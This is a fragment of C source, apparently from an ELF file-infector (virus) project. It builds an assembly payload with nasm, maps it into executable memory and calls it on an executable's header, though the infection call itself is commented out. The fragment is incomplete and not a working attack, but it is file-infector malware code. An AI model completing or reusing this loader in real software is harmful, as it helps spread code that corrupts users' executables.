...
static int  infectFile(const char *dirname, struct dirent *file) {
  ...
  if ((handle = dlopen(NULL, RTLD_NOW)) == NULL)
    return (-1);
  /* infection(dlsym, handle, header, dirname, file->d_name, payload); */
  dlclose(handle);
  return (0);
  ...
  system("nasm -f bin ./srcs/payload.s -o payload");
  if ((fd = open("./payload", O_RDONLY)) == -1)
    return (-1);
  if (fstat(fd, &stats) == -1)
    return (-1);
  if ((fun = mmap(0, stats.st_size, PROT_READ | PROT_EXEC, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
    return (-1);
  close(fd);
  dprintf(1, "Shoff: %zu\n", header.header->e_shoff);
  dprintf(1, "Should find: %p\n", header.header);
  fun(header.header);
  munmap(fun, stats.st_size);
